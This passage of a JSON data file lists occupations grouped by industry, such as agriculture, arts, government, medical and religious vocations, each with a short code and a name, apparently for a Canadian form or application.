                    {"id":"GOCLK","name":"General Office Clerk"}
                    ,
                    {"id":"HRCON","name":"Human Resources Consultant"}
                    ,
                    {"id":"INTAUD","name":"Internal Auditor"}
                    ,
                    {"id":"INVCCL","name":"Inventory Control Clerk"}
                    ,
                    {"id":"INVCCS","name":"Inventory Control Specialist"}
                    ,
                    {"id":"LEGADM","name":"Legal Administration"}
                    ,
                    {"id":"MADSV","name":"Manager - Administrative Services"}
                    ,
                    {"id":"MANHRS","name":"Manager - Human Resources"}
                    ,
                    {"id":"MEDTR","name":"Mediator"}
                    ,
                    {"id":"OFFMAN","name":"Office Manager"}
                    ,
                    {"id":"PERAST","name":"Personal Assistant"}
                    ,
                    {"id":"PREOFF","name":"Procurement Officer"}
                    ,
                    {"id":"PROMAN","name":"Project Manager"}
                    ,
                    {"id":"PURAG","name":"Purchasing Agent"}
                    ,
                    {"id":"RCPST","name":"Receptionist"}
                    ,
                    {"id":"RECRUI","name":"Recruiter"}
                    ,
                    {"id":"RELSUA","name":"Related Support Activities"}
                    ,
                    {"id":"RMGMTE","name":"Records Management Technician"}
                    ,
                    {"id":"SECGU","name":"Security Guard"}
                    ,
                    {"id":"TELOP","name":"Telephone Operator"}
                    ,
                    {"id":"UNREP","name":"Union Representative"}
                    ]},
                {"id":"ANRAN", "name":"Agriculture & Natural Resources" , "occupation":[
                
                    {"id":"ACQWK","name":"Aquaculture Worker"}
                    ,
                    {"id":"AGRWOR","name":"Agricultural Worker"}
                    ,
                    {"id":"BREEDR","name":"Breeder"}
                    ,
                    {"id":"CONSER","name":"Conservationist"}
                    ,
                    {"id":"CUSERE","name":"Customer Service Representative"}
                    ,
                    {"id":"DAIWOR","name":"Dairy Worker"}
                    ,
                    {"id":"DRIGAS","name":"Drilling - Gas/Oil Worker"}
                    ,
                    {"id":"EXSMAG","name":"Executive/Senior Manager - Agriculture"}
                    ,
                    {"id":"EXSMNR","name":"Executive/Senior Manager - Natural Resources"}
                    ,
                    {"id":"FLORIS","name":"Florist"}
                    ,
                    {"id":"FOODPR","name":"Food Producer"}
                    ,
                    {"id":"FRMWK","name":"Farm Worker"}
                    ,
                    {"id":"FSHWK","name":"Fisheries Worker"}
                    ,
                    {"id":"FSTWK","name":"Forestry Worker"}
                    ,
                    {"id":"GRELOP","name":"Grain Elevator Operator"}
                    ,
                    {"id":"HARVES","name":"Harvester"}
                    ,
                    {"id":"HORWOR","name":"Horticulture Worker"}
                    ,
                    {"id":"INSPAN","name":"Inspector"}
                    ,
                    {"id":"LAGWOR","name":"Logging Worker"}
                    ,
                    {"id":"LISTWO","name":"Live Stock Worker"}
                    ,
                    {"id":"METERO","name":"Meteorologist"}
                    ,
                    {"id":"MGRAGR","name":"Manager - Agriculture"}
                    ,
                    {"id":"MGRNAR","name":"Manager - Natural Resources"}
                    ,
                    {"id":"MNEWK","name":"Mine Worker"}
                    ,
                    {"id":"MTLWK","name":"Metals Processing Worker"}
                    ,
                    {"id":"NURGHW","name":"Nursery/Greenhouse Worker"}
                    ,
                    {"id":"OILWOR","name":"Oil Industry Worker"}
                    ,
                    {"id":"PETWOR","name":"Petroleum Industry Worker"}
                    ,
                    {"id":"PUPWK","name":"Pulp and Paper Processing Worker"}
                    ,
                    {"id":"QUAWOR","name":"Quarry Worker"}
                    ,
                    {"id":"RELSAC","name":"Related Support Activities"}
                    ,
                    {"id":"RSRCAN","name":"Researcher"}
                    ,
                    {"id":"SOPOWK","name":"Solar Power Worker "}
                    ,
                    {"id":"TRAHUN","name":"Trapper/Hunter"}
                    ,
                    {"id":"UNDWOR","name":"Underground Worker"}
                    ]},
                {"id":"ACACA", "name":"Arts & Communications" , "occupation":[
                
                    {"id":"ACTORA","name":"Actor/Actress"}
                    ,
                    {"id":"ADVSPE","name":"Advertising Specialist"}
                    ,
                    {"id":"ANNOUN","name":"Announcer/Broadcaster"}
                    ,
                    {"id":"ANTDEA","name":"Antique Dealer"}
                    ,
                    {"id":"ARTCRA","name":"Artisan/Crafter"}
                    ,
                    {"id":"ARTST","name":"Artist"}
                    ,
                    {"id":"AUDTEC","name":"Audio-visual Technician"}
                    ,
                    {"id":"AUTHOR","name":"Author"}
                    ,
                    {"id":"CHOREO","name":"Choreographer"}
                    ,
                    {"id":"COMPOS","name":"Composer"}
                    ,
                    {"id":"COMSP","name":"Communications Specialist"}
                    ,
                    {"id":"CONDUC","name":"Conductor"}
                    ,
                    {"id":"CURATO","name":"Curator"}
                    ,
                    {"id":"DANCER","name":"Dancer"}
                    ,
                    {"id":"DESAC","name":"Designer - Arts & Communications"}
                    ,
                    {"id":"DIRECT","name":"Director"}
                    ,
                    {"id":"EDITR","name":"Editor"}
                    ,
                    {"id":"EXSMAC","name":"Executive/Senior Manager - Arts and Communications"}
                    ,
                    {"id":"GRAART","name":"Graphic Artist"}
                    ,
                    {"id":"GRADIS","name":"Graphic Designer"}
                    ,
                    {"id":"ILUSTR","name":"Illustrator"}
                    ,
                    {"id":"INSTRC","name":"Instructor"}
                    ,
                    {"id":"INTDEC","name":"Interior Decorator/Designer"}
                    ,
                    {"id":"INTERP","name":"Interpreter"}
                    ,
                    {"id":"JORNT","name":"Journalist"}
                    ,
                    {"id":"MEDREL","name":"Media Relations"}
                    ,
                    {"id":"MGRAAC","name":"Manager - Arts and Communications"}
                    ,
                    {"id":"MUSICN","name":"Musician"}
                    ,
                    {"id":"MUSWOR","name":"Museum Worker"}
                    ,
                    {"id":"PBRLWK","name":"Public Relations Worker"}
                    ,
                    {"id":"PERART","name":"Performing Arts"}
                    ,
                    {"id":"PERFA","name":"Performance Artist"}
                    ,
                    {"id":"PHOTR","name":"Photographer"}
                    ,
                    {"id":"PRDAR","name":"Producer - Arts"}
                    ,
                    {"id":"PRDWOR","name":"Production Worker"}
                    ,
                    {"id":"PRFRDR","name":"Proofreader"}
                    ,
                    {"id":"PRNTR","name":"Printer"}
                    ,
                    {"id":"PUBLR","name":"Publisher"}
                    ,
                    {"id":"REPTR","name":"Reporter"}
                    ,
                    {"id":"RESAC","name":"Reseacher - Arts & Communications"}
                    ,
                    {"id":"RSACAC","name":"Related Support Activities"}
                    ,
                    {"id":"SCULPR","name":"Sculptor"}
                    ,
                    {"id":"SINGER","name":"Singer"}
                    ,
                    {"id":"TATART","name":"Tattoo Artist"}
                    ,
                    {"id":"THEWOR","name":"Theatre Worker"}
                    ,
                    {"id":"TRNSR","name":"Translator"}
                    ,
                    {"id":"VDCAOP","name":"Film/Video Camera Operator"}
                    ,
                    {"id":"WRITR","name":"Writer"}
                    ]},
                {"id":"BMBMB", "name":"Business Management" , "occupation":[
                
                    {"id":"CEOFF","name":"Chief Executive Officer"}
                    ,
                    {"id":"CFO","name":"Chief Financial Officer"}
                    ,
                    {"id":"CIO","name":"Chief Information Officer"}
                    ,
                    {"id":"CNSTBM","name":"Consultant"}
                    ,
                    {"id":"COOFF","name":"Chief Operating Officer"}
                    ,
                    {"id":"GMNGR","name":"General Manager"}
                    ,
                    {"id":"HRSPE","name":"Human Resources Specialist"}
                    ,
                    {"id":"INAUDT","name":"Internal Auditor"}
                    ,
                    {"id":"INVANA","name":"Investment Analyst"}
                    ,
                    {"id":"INVBK","name":"Investment Banker"}
                    ,
                    {"id":"INVCON","name":"Investment Consultant"}
                    ,
                    {"id":"MNGCO","name":"Management Consultant"}
                    ,
                    {"id":"PURMG","name":"Purchasing Manager"}
                    ,
                    {"id":"QA","name":"Quality Assurance"}
                    ,
                    {"id":"RSACBM","name":"Related Support Activities"}
                    ]},
                {"id":"ETETE", "name":"Education & Training" , "occupation":[
                
                    {"id":"BUSDRV","name":"Bus Driver"}
                    ,
                    {"id":"CARTKR","name":"Caretaker/Janitor"}
                    ,
                    {"id":"CHICW","name":"Child Care Worker"}
                    ,
                    {"id":"CNSLOR","name":"Counsellor"}
                    ,
                    {"id":"DEAN","name":"Dean"}
                    ,
                    {"id":"EDASI","name":"Educational Assistant"}
                    ,
                    {"id":"EMPCO","name":"Employment Counsellor"}
                    ,
                    {"id":"ERLCED","name":"Early Childhood Educator"}
                    ,
                    {"id":"EXSMET","name":"Executive/Senior Manager - Education and Training"}
                    ,
                    {"id":"HISTOR","name":"Historian"}
                    ,
                    {"id":"INSTRU","name":"Instructor"}
                    ,
                    {"id":"LIBRA","name":"Librarian"}
                    ,
                    {"id":"LIFCOA","name":"Life Coach"}
                    ,
                    {"id":"MGRET","name":"Manager - Education and Training"}
                    ,
                    {"id":"OASECR","name":"Office Administration/Secretary"}
                    ,
                    {"id":"PRINC","name":"Principal"}
                    ,
                    {"id":"PROFE","name":"Professor"}
                    ,
                    {"id":"RESEA","name":"Research Assistant"}
                    ,
                    {"id":"RSACET","name":"Related Support Activities"}
                    ,
                    {"id":"RSRCET","name":"Researcher"}
                    ,
                    {"id":"SCHCO","name":"School Counsellor"}
                    ,
                    {"id":"SUPRIN","name":"Superintendent"}
                    ,
                    {"id":"TEACAST","name":"Teaching Assistant"}
                    ,
                    {"id":"TECHR","name":"Teacher"}
                    ,
                    {"id":"TRANR","name":"Trainer"}
                    ,
                    {"id":"TUTOR","name":"Tutor"}
                    ,
                    {"id":"VP","name":"Vice Principal"}
                    ]},
                {"id":"ESGES", "name":"Emergency Services & Government" , "occupation":[
                
                    {"id":"ADMNVY","name":"Admiral - Navy"}
                    ,
                    {"id":"AMBSDR","name":"Ambassador"}
                    ,
                    {"id":"ATTACHE","name":"Attache"}
                    ,
                    {"id":"BAILFF","name":"Bailiff"}
                    ,
                    {"id":"BRDSAG","name":"Border Security Agent/Officer"}
                    ,
                    {"id":"BRGENM","name":"Brigadier-General - Military"}
                    ,
                    {"id":"CABMNF","name":"Cabinet Minister - Federal"}
                    ,
                    {"id":"CABMNP","name":"Cabinet Minister - Provincial"}
                    ,
                    {"id":"CANARP","name":"Canadian Army  Personnel"}
                    ,
                    {"id":"CAPNVY","name":"Captain - Navy"}
                    ,
                    {"id":"CITYC","name":"City Counsellor"}
                    ,
                    {"id":"CMDNVY","name":"Commodore - Navy"}
                    ,
                    {"id":"CNSTES","name":"Consultant"}
                    ,
                    {"id":"COLMIL","name":"Colonel - Military"}
                    ,
                    {"id":"COMNVY","name":"Commander - Navy"}
                    ,
                    {"id":"COMSWK","name":"Community Services Worker"}
                    ,
                    {"id":"CORRO","name":"Corrections Officer"}
                    ,
                    {"id":"CTYADM","name":"City Administrator"}
                    ,
                    {"id":"CUSOFF","name":"Customs Officer"}
                    ,
                    {"id":"DEPMIN","name":"Deputy Minister"}
                    ,
                    {"id":"DIPLOM","name":"Diplomat"}
                    ,
                    {"id":"EMEMT","name":"Emergency Medical Technician"}
                    ,
                    {"id":"FEDDMI","name":"Federal Deputy Minister"}
                    ,
                    {"id":"FIRECH","name":"Fire Chief"}
                    ,
                    {"id":"FIREF","name":"Firefighter"}
                    ,
                    {"id":"GENMIL","name":"General - Military"}
                    ,
                    {"id":"GOVGEN","name":"Governor General"}
                    ,
                    {"id":"GOVIN","name":"Government Inspector"}
                    ,
                    {"id":"GOVSO","name":"Government Services Officer"}
                    ,
                    {"id":"GOVSOF","name":"Government Services Officer - Federal"}
                    ,
                    {"id":"GOVSOM","name":"Government Services Officer - Municipal"}
                    ,
                    {"id":"GOVSOP","name":"Government Services Officer - Provincial"}
                    ,
                    {"id":"HPAGAG","name":"Head of a Government Agency"}
                    ,
                    {"id":"INSPES","name":"Inspector"}
                    ,
                    {"id":"JUDGE","name":"Judge"}
                    ,
                    {"id":"LCLMIL","name":"Lieutenant Colonel - Military"}
                    ,
                    {"id":"LCMNVY","name":"Lieutenant Commander - Navy"}
                    ,
                    {"id":"LDRFPP","name":"Leader - Federal Politicial Party"}
                    ,
                    {"id":"LDRPPP","name":"Leader - Provincial Politicial Party"}
                    ,
                    {"id":"LGENML","name":"Lieutenant General - Military"}
                    ,
                    {"id":"MAJGML","name":"Major General - Military"}
                    ,
                    {"id":"MAJMIL","name":"Major - Military"}
                    ,
                    {"id":"MAYOR","name":"Mayor"}
                    ,
                    {"id":"MEMOP","name":"Member of Parliament"}
                    ,
                    {"id":"MEMPP","name":"Member of Provincial Parliament"}
                    ,
                    {"id":"MILOF","name":"Military Officer"}
                    ,
                    {"id":"MILSP","name":"Military Service Person"}
                    ,
                    {"id":"PADIC","name":"Paramedic"}
                    ,
                    {"id":"POLAN","name":"Policy Analyst"}
                    ,
                    {"id":"POLCHF","name":"Police Chief"}
                    ,
                    {"id":"POLOF","name":"Police Officer"}
                    ,
                    {"id":"POSTW","name":"Postal Worker"}
                    ,
                    {"id":"PREMPR","name":"Premiere of a Province/Territory"}
                    ,
                    {"id":"PRMNCN","name":"Prime Minister of Canada"}
                    ,
                    {"id":"PROOFF","name":"Program Officer"}
                    ,
                    {"id":"RADMNV","name":"Rear-Admiral - Navy"}
                    ,
                    {"id":"RCAFPE","name":"Royal Canadian Air Force Personnel"}
                    ,
                    {"id":"RCMPOL","name":"Royal Canadian Mounted Police"}
                    ,
                    {"id":"RCNVYP","name":"Royal Canadian Navy Personnel"}
                    ,
                    {"id":"RGLOFC","name":"Regulatory Officer"}
                    ,
                    {"id":"RGLSPA","name":"Related Support Activities"}
                    ,
                    {"id":"RSRCES","name":"Researcher"}
                    ,
                    {"id":"SCHBT","name":"School Board Trustee"}
                    ,
                    {"id":"SENMIO","name":"Senior Military Officer"}
                    ,
                    {"id":"SENTR","name":"Senator"}
                    ,
                    {"id":"SOCWK","name":"Social Worker"}
                    ,
                    {"id":"URBPL","name":"Urban Planner"}
                    ,
                    {"id":"VANAVY","name":"Vice-Admiral - Navy"}
                    ,
                    {"id":"WASTE","name":"Waste Collection"}
                    ]},
                {"id":"EASEA", "name":"Engineering, Architecture & Science" , "occupation":[
                
                    {"id":"AERENG","name":"Aerospace Engineers"}
                    ,
                    {"id":"ARCHI","name":"Architect"}
                    ,
                    {"id":"ASTMR","name":"Astronomer"}
                    ,
                    {"id":"BIOHEM","name":"Biochemist"}
                    ,
                    {"id":"BIOLT","name":"Biologist"}
                    ,
                    {"id":"CHEANA","name":"Chemist - Analytical"}
                    ,
                    {"id":"CHECAR","name":"Chemist - Carbon/Carbon Compounds"}
                    ,
                    {"id":"CHEDEV","name":"Chemist - Development"}
                    ,
                    {"id":"CHEMED","name":"Chemist - Medical"}
                    ,
                    {"id":"CHENCA","name":"Chemist - Non-Carbon"}
                    ,
                    {"id":"CHENG","name":"Chemical Engineer"}
                    ,
                    {"id":"CHEPAM","name":"Chemist - Pharmaceutical Manufacturer"}
                    ,
                    {"id":"CHEPHY","name":"Chemist - Physical"}
                    ,
                    {"id":"CHESCR","name":"Chemist - Scientific Research"}
                    ,
                    {"id":"CHETEL","name":"Chemist - Testing Laboratories"}
                    ,
                    {"id":"CHMIT","name":"Chemist"}
                    ,
                    {"id":"CIVEN","name":"Civil Engineer"}
                    ,
                    {"id":"CNSTEA","name":"Consultant"}
                    ,
                    {"id":"ELENG","name":"Electrical Engineer"}
                    ,
                    {"id":"ELPWCB","name":"Electrical Power Cable and Line Worker"}
                    ,
                    {"id":"EXCSMG","name":"Executive/Senior Manager - Architecture"}
                    ,
                    {"id":"EXESMS","name":"Executive/Senior Manager - Science"}
                    ,
                    {"id":"EXESNE","name":"Executive/Senior Manager - Engineering"}
                    ,
                    {"id":"GEOLT","name":"Geologist"}
                    ,
                    {"id":"INDENG","name":"Industrial Engineer"}
                    ,
                    {"id":"INSPEA","name":"Inspector"}
                    ,
                    {"id":"LABTEC","name":"Laboratory Technician"}
                    ,
                    {"id":"MATHM","name":"Mathematician"}
                    ,
                    {"id":"MECEN","name":"Mechanical Engineer"}
                    ,
                    {"id":"METALG","name":"Metallurgist"}
                    ,
                    {"id":"METRLG","name":"Meteorologist"}
                    ,
                    {"id":"MGRARC","name":"Manager - Architecture"}
                    ,
                    {"id":"MGRENG","name":"Manager - Engineering"}
                    ,
                    {"id":"MGRSCI","name":"Manager - Science"}
                    ,
                    {"id":"MNENGR","name":"Mining Engineer"}
                    ,
                    {"id":"MNFENG","name":"Manufacturing Engineer"}
                    ,
                    {"id":"NUCPWR","name":"Nuclear Power Worker"}
                    ,
                    {"id":"PHYST","name":"Physicist"}
                    ,
                    {"id":"PRMNGR","name":"Project Manager"}
                    ,
                    {"id":"PROENG","name":"Professional Engineer"}
                    ,
                    {"id":"PSYENG","name":"Power Systems Engineer"}
                    ,
                    {"id":"PTRENG","name":"Petroleum Engineer"}
                    ,
                    {"id":"RESCH","name":"Researcher"}
                    ,
                    {"id":"RSACEA","name":"Related Support Activities"}
                    ,
                    {"id":"SCIEN","name":"Scientist"}
                    ,
                    {"id":"URBPLN","name":"Urban Planner"}
                    ]},
                {"id":"HFSTH", "name":"Hospitality, Food Service & Tourism" , "occupation":[
                
                    {"id":"BAKER","name":"Baker"}
                    ,
                    {"id":"BARTND","name":"Bartender"}
                    ,
                    {"id":"BUTCHR","name":"Butcher/Meat Cutter"}
                    ,
                    {"id":"CASDLR","name":"Casino Dealer"}
                    ,
                    {"id":"CASSER","name":"Casino Server"}
                    ,
                    {"id":"CATRER","name":"Caterer"}
                    ,
                    {"id":"CHEF","name":"Chef"}
                    ,
                    {"id":"COOK","name":"Cook"}
                    ,
                    {"id":"CSR","name":"Customer Service Representative"}
                    ,
                    {"id":"EVEPL","name":"Events Planner"}
                    ,
                    {"id":"FODSW","name":"Food Services Worker"}
                    ,
                    {"id":"HOSSW","name":"Hospitality Services Worker"}
                    ,
                    {"id":"HOSTES","name":"Host/Hostess"}
                    ,
                    {"id":"HOTMG","name":"Hotel Manager"}
                    ,
                    {"id":"HSKPER","name":"Housekeeper"}
                    ,
                    {"id":"HTLSTF","name":"Hotel Staff"}
                    ,
                    {"id":"KITSTF","name":"Kitchen Staff"}
                    ,
                    {"id":"MGRHFS","name":"Manager - Hospitality, Food Services, Tourism"}
                    ,
                    {"id":"PASCHF","name":"Pastry Chef"}
                    ,
                    {"id":"RESMG","name":"Restaurant Manager"}
                    ,
                    {"id":"RSACHF","name":"Related Support Activities"}
                    ,
                    {"id":"SANENG","name":"Sanitation Engineer"}
                    ,
                    {"id":"SECGAR","name":"Security Guard"}
                    ,
                    {"id":"SMHOSP","name":"Executive/Senior Manager - Hospitality, Food Services, Tourism"}
                    ,
                    {"id":"SOUCHE","name":"Sous Chef"}
                    ,
                    {"id":"TOURGD","name":"Tour/Travel Guide"}
                    ,
                    {"id":"TRAVA","name":"Travel Agent"}
                    ,
                    {"id":"WAITER","name":"Waiter/Server"}
                    ]},
                {"id":"ITITI", "name":"Information Technology" , "occupation":[
                
                    {"id":"CMPENG","name":"Computer Engineer"}
                    ,
                    {"id":"CNSTIT","name":"Consultant"}
                    ,
                    {"id":"COMCO","name":"Computer Consultant"}
                    ,
                    {"id":"DCMNG","name":"Data Centre Manager"}
                    ,
                    {"id":"DTENCL","name":"Data Entry Clerk"}
                    ,
                    {"id":"ELWRKR","name":"Electronics Worker"}
                    ,
                    {"id":"EXESMIT","name":"Executive/Senior Manager -  Information Technology"}
                    ,
                    {"id":"GRPDSG","name":"Graphic Designer"}
                    ,
                    {"id":"INFSA","name":"Information Systems Analyst"}
                    ,
                    {"id":"INFSM","name":"Information Systems Manager"}
                    ,
                    {"id":"ITPMR","name":"Information Technology Project Manager"}
                    ,
                    {"id":"ITSPEC","name":"Information Technology Specialist"}
                    ,
                    {"id":"MANGIT","name":"Manager -  Information Technology"}
                    ,
                    {"id":"PRGMR","name":"Programmer"}
                    ,
                    {"id":"RSACIT","name":"Related Support Activities"}
                    ,
                    {"id":"SOFEN","name":"Software Engineer"}
                    ,
                    {"id":"TELINT","name":"Telecommunications Installation"}
                    ,
                    {"id":"TELREP","name":"Television Repair"}
                    ,
                    {"id":"TELSP","name":"Telecommunications Specialist"}
                    ,
                    {"id":"TLLCBW","name":"Telecommunications Line and Cable Worker"}
                    ,
                    {"id":"WEBDS","name":"Web Designer"}
                    ]},
                {"id":"LSLSL", "name":"Legal Services" , "occupation":[
                
                    {"id":"ADMST","name":"Administrative Assistant"}
                    ,
                    {"id":"ARBTER","name":"Arbitrator"}
                    ,
                    {"id":"ARTSL","name":"Articling Student - Law"}
                    ,
                    {"id":"BAIL","name":"Bailiff"}
                    ,
                    {"id":"BYLO","name":"By-law Officer"}
                    ,
                    {"id":"COROF","name":"Court Officer"}
                    ,
                    {"id":"CREP","name":"Court Reporter"}
                    ,
                    {"id":"CROF","name":"Corrections Officer"}
                    ,
                    {"id":"JUDGEF","name":"Judge - Federal"}
                    ,
                    {"id":"JUDGEP","name":"Judge - Provincial/Territorial"}
                    ,
                    {"id":"JUDGES","name":"Judge - Supreme"}
                    ,
                    {"id":"JUDGJ","name":"Judge"}
                    ,
                    {"id":"JUDGMI","name":"Judge - Military"}
                    ,
                    {"id":"JUDGMU","name":"Judge - Municipal"}
                    ,
                    {"id":"JUSOP","name":"Justice of the Peace"}
                    ,
                    {"id":"LAWCK","name":"Law Clerk"}
                    ,
                    {"id":"LAWYR","name":"Lawyer"}
                    ,
                    {"id":"NOTAR","name":"Notary"}
                    ,
                    {"id":"PALEG","name":"Paralegal"}
                    ,
                    {"id":"PAROFF","name":"Parole Officer"}
                    ,
                    {"id":"PRBOF","name":"Probation Officer"}
                    ,
                    {"id":"REGIST","name":"Registrar"}
                    ,
                    {"id":"RESATV","name":"Related Support Activities"}
                    ,
                    {"id":"SCRGRD","name":"Security Guard"}
                    ]},
                {"id":"MCGSM", "name":"Medical & Care Giving Services" , "occupation":[
                
                    {"id":"ACUPNT","name":"Acupuncturist"}
                    ,
                    {"id":"ADIGT","name":"Audiologist"}
                    ,
                    {"id":"CARDIO","name":"Cardiologist"}
                    ,
                    {"id":"CHIPR","name":"Chiropractor"}
                    ,
                    {"id":"CNESLR","name":"Counsellor"}
                    ,
                    {"id":"CORON","name":"Coroner"}
                    ,
                    {"id":"DAYCW","name":"Day Care Worker"}
                    ,
                    {"id":"DENASS","name":"Dental Assistant"}
                    ,
                    {"id":"DENHYG","name":"Dental Hygienist"}
                    ,
                    {"id":"DISPTCH","name":"Dispatcher"}
                    ,
                    {"id":"DENTI","name":"Dentist"}
                    ,
                    {"id":"DIETN","name":"Dietician"}
                    ,
                    {"id":"DNTEC","name":"Dental Technician"}
                    ,
                    {"id":"DRGPR","name":"Doctor - General Practitioner"}
                    ,
                    {"id":"DRSPE","name":"Doctor - Specialist"}
                    ,
                    {"id":"FOSPAR","name":"Foster Parent"}
                    ,
                    {"id":"FUHOW","name":"Funeral Home Worker"}
                    ,
                    {"id":"HCCON","name":"Health Care Counsellor"}
                    ,
                    {"id":"HOMCRW","name":"Home Care Worker"}
                    ,
                    {"id":"HOMEOP","name":"Homeopath"}
                    ,
                    {"id":"HOSAD","name":"Hospital Administrator"}
                    ,
                    {"id":"INSPMC","name":"Inspector"}
                    ,
                    {"id":"LABOTE","name":"Laboratory Technician"}
                    ,
                    {"id":"MASTH","name":"Massage Therapist"}
                    ,
                    {"id":"MEDTC","name":"Medical Technician"}
                    ,
                    {"id":"MIDWF","name":"Midwife"}
                    ,
                    {"id":"MORTIC","name":"Mortician"}
                    ,
                    {"id":"NANNY","name":"Nanny"}
                    ,
                    {"id":"NATURO","name":"Naturopath"}
                    ,
                    {"id":"NRSAID","name":"Nursing Aide"}
                    ,
                    {"id":"NRSPRC","name":"Nurse Practitioner"}
                    ,
                    {"id":"NURSE","name":"Nurse"}
                    ,
                    {"id":"NUTRLS","name":"Nutritionalist"}
                    ,
                    {"id":"OCCTH","name":"Occupational Therapist"}
                    ,
                    {"id":"OPHST","name":"Ophthalmologist"}
                    ,
                    {"id":"OPTCAN","name":"Optician"}
                    ,
                    {"id":"OPTST","name":"Optometrist"}
                    ,
                    {"id":"PARIC","name":"Paramedic"}
                    ,
                    {"id":"PARTEC","name":"Pharmacy Technician"}
                    ,
                    {"id":"PATHOL","name":"Pathologist"}
                    ,
                    {"id":"PERSWR","name":"Personal Support Worker"}
                    ,
                    {"id":"PHAST","name":"Pharmacist"}
                    ,
                    {"id":"PHYSO","name":"Physiotherapist"}
                    ,
                    {"id":"PODIAT","name":"Podiatrist"}
                    ,
                    {"id":"PSYCH","name":"Psychologist"}
                    ,
                    {"id":"RADIOL","name":"Radiologist"}
                    ,
                    {"id":"REHABS","name":"Rehabilitation Specialist"}
                    ,
                    {"id":"RESTH","name":"Respiratory Therapist"}
                    ,
                    {"id":"RSACMC","name":"Related Support Activities"}
                    ,
                    {"id":"RSRCMC","name":"Researcher"}
                    ,
                    {"id":"SOSEW","name":"Social Services Worker"}
                    ,
                    {"id":"SPEPAT","name":"Speech Pathologist"}
                    ,
                    {"id":"THEROT","name":"Therapist - Other"}
                    ,
                    {"id":"THMES","name":"Therapist - Medical Services"}
                    ,
                    {"id":"VETER","name":"Veterinarian"}
                    ,
                    {"id":"VETTEC","name":"Vet Technician"}
                    ]},
                {"id":"RESRE", "name":"Real Estate Services" , "occupation":[
                
                    {"id":"ACTVIT","name":"Related Support Activities"}
                    ,
                    {"id":"APPRSR","name":"Appraiser"}
                    ,
                    {"id":"HOMBLD","name":"Home Builder"}
                    ,
                    {"id":"HOMEIN","name":"Home Inspector"}
                    ,
                    {"id":"LANDEV","name":"Land Developer"}
                    ,
                    {"id":"LANDSC","name":"Landscaper"}
                    ,
                    {"id":"LANSU","name":"Land Surveyor"}
                    ,
                    {"id":"MORTB","name":"Mortgage Broker"}
                    ,
                    {"id":"PRMANG","name":"Property Manager"}
                    ,
                    {"id":"PROPA","name":"Property Assessor"}
                    ,
                    {"id":"RAGNT","name":"Real Estate Agent"}
                    ,
                    {"id":"RENVAT","name":"Renovator"}
                    ,
                    {"id":"RESBRK","name":"Real Estate Broker"}
                    ,
                    {"id":"RLESA","name":"Real Estate Assessor"}
                    ]},
                {"id":"RVRVR", "name":"Religious Vocation" , "occupation":[
                
                    {"id":"CHAPL","name":"Chaplain"}
                    ,
                    {"id":"CLRGY","name":"Clergy"}
                    ,
                    {"id":"DCONE","name":"Deacon"}
                    ,
                    {"id":"IMAMM","name":"Imam"}
                    ,
                    {"id":"MINTR","name":"Minister"}
                    ,
                    {"id":"MONKK","name":"Monk"}
                    ,
                    {"id":"MONSOR","name":"Monsignor"}
                    ,
                    {"id":"MSSNE","name":"Missionary"}
                    ,
                    {"id":"NUNNN","name":"Nun"}
                    ,
                    {"id":"PRIST","name":"Priest"}
                    ,
                    {"id":"RABBI","name":"Rabbi"}
                    ,
                    {"id":"RELWK","name":"Religious Worker"}
                    ,
                    {"id":"RSACRV","name":"Related Support Activities"}
                    ]},
                {"id":"SMRSM", "name":"Sales, Marketing & Retail Services" , "occupation":[
                
                    {"id":"ACTINR","name":"Auctioneer"}
                    ,
                    {"id":"ANCRWR","name":"Animal Care Worker"}
                    ,
                    {"id":"ANTRNR","name":"Animal Trainer"}
                    ,
                    {"id":"AREPTC","name":"Automotive Repair Technician"}
                    ,
                    {"id":"ASALES","name":"Automotive Sales"}
                    ,
                    {"id":"ASERVC","name":"Automotive Service"}
                    ,
                    {"id":"ATTSER","name":"Service Station Attendant"}
                    ,
                    {"id":"AURCND","name":"Automotive Reconditioning"}
                    ,
                    {"id":"BARBER","name":"Barber"}
                    ,
                    {"id":"BUYER","name":"Buyer"}
                    ,
                    {"id":"CASHR","name":"Cashier"}
                    ,
                    {"id":"CCSUPP","name":"Call Center Support"}
                    ,
                    {"id":"CLNDRY","name":"Dry Cleaner"}
                    ,
                    {"id":"CLSRVC","name":"Cleaning Service"}
                    ,
                    {"id":"COSME","name":"Cosmetologist"}
                    ,
                    {"id":"ELECTR","name":"Electrologist"}
                    ,
                    {"id":"ENGSAN","name":"Sanitation Engineer"}
                    ,
                    {"id":"ESTHET","name":"Esthetician"}
                    ,
                    {"id":"EXPEST","name":"Exterminator/Pest Control"}
                    ,
                    {"id":"GROMER","name":"Animal Groomer"}
                    ,
                    {"id":"HAIRD","name":"Hairdresser"}
                    ,
                    {"id":"IMPEXP","name":"Importer/Exporter"}
                    ,
                    {"id":"INSTSM","name":"Installer"}
                    ,
                    {"id":"JEWEL","name":"Jeweler"}
                    ,
                    {"id":"LNDSCA","name":"Landscaper"}
                    ,
                    {"id":"LCKSMT","name":"Locksmith"}
                    ,
                    {"id":"MARMAN","name":"Manager - Marketing"}
                    ,
                    {"id":"MERCHR","name":"Merchandiser"}
                    ,
                    {"id":"MGRRET","name":"Manager - Retail"}
                    ,
                    {"id":"MGRSAL","name":"Manager - Sales"}
                    ,
                    {"id":"MKTRP","name":"Marketing Representative"}
                    ,
                    {"id":"OFCCLN","name":"Home/Office Cleaner"}
                    ,
                    {"id":"RSCRSC","name":"Customer Service Representative"}
                    ,
                    {"id":"RTISAN","name":"Artisan"}
                    ,
                    {"id":"RTLSW","name":"Retail Services Worker"}
                    ,
                    {"id":"SALEP","name":"Salesperson"}
                    ,
                    {"id":"SERSPA","name":"Spa Services"}
                    ,
                    {"id":"SHOMKR","name":"Shoe Repair/Shoemaker"}
                    ,
                    {"id":"SUREAC","name":"Related Support Activities"}
                    ,
                    {"id":"TAILSEA","name":"Seamstress/Tailor"}
                    ,
                    {"id":"TELMK","name":"Telemarketer"}
                    ,
                    {"id":"UPHLST","name":"Upholster"}
                    ,
                    {"id":"WWASHR","name":"Window Washer"}
                    ]},
                {"id":"SLSLS", "name":"Sports & Leisure" , "occupation":[
                
                    {"id":"AMSWOR","name":"Amusement Park Worker"}
                    ,
                    {"id":"COACH","name":"Coach"}
                    ,
                    {"id":"GDIREC","name":"Recreational Guide"}
                    ,
                    {"id":"GURDLIF","name":"Lifeguard"}
                    ,
                    {"id":"PERSW","name":"Personal Services Worker"}
                    ,
                    {"id":"PERTR","name":"Personal Trainer"}
                    ,
                    {"id":"PROAT","name":"Professional Athlete"}
                    ,
                    {"id":"RSACSL","name":"Related Support Activities"}
                    ,
